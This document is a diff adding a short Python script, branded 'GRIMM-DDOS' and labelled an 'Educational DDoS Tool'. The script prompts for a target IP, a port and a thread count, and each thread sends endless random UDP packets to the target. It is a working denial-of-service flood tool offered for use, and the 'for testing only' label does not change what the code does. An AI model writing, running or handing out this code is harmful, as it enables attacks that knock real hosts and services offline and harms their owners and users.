@@ -1,0 +1,54 @@
+#!/usr/bin/env python3
+import socket
+import threading
+import random
+import os
+import time
+
+# Couleurs
+RED = '\033[91m'
+GREEN = '\033[92m'
+CYAN = '\033[96m'
+YELLOW = '\033[93m'
+RESET = '\033[0m'
+
+def banner():
+    os.system("clear")
+    print(f"""{CYAN}
+   ██████╗ ██████╗  ██████╗ ███╗   ███╗███╗   ██╗
+  ██╔════╝██╔═══██╗██╔═══██╗████╗ ████║████╗  ██║
+  ██║     ██║   ██║██║   ██║██╔████╔██║██╔██╗ ██║
+  ██║     ██║   ██║██║   ██║██║╚██╔╝██║██║╚██╗██║
+  ╚██████╗╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║ ╚████║
+   ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝
+     {YELLOW}GRIMM-DDOS | Educational DDoS Tool{CYAN}
+           By GRIMM - For Testing Only
+{RESET}
+""")
+
+def attack(ip, port):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    data = random._urandom(1024)
+    while True:
+        try:
+            client.sendto(data, (ip, port))
+            print(f"{GREEN}[+] Attack sent to {ip}:{port}{RESET}")
+        except:
+            print(f"{RED}[-] Failed to send packet.{RESET}")
+            break
+
+def main():
+    banner()
+    ip = input(f"{CYAN}[?] Enter Target IP: {RESET}")
+    port = int(input(f"{CYAN}[?] Enter Target Port: {RESET}"))
+    threads = int(input(f"{CYAN}[?] Number of Threads: {RESET}"))
+
+    print(f"\n{YELLOW}[*] Starting attack simulation...{RESET}")
+    time.sleep(1)
+
+    for _ in range(threads):
+        t = threading.Thread(target=attack, args=(ip, port))
+        t.start()
+
+if __name__ == "__main__":
+    main()
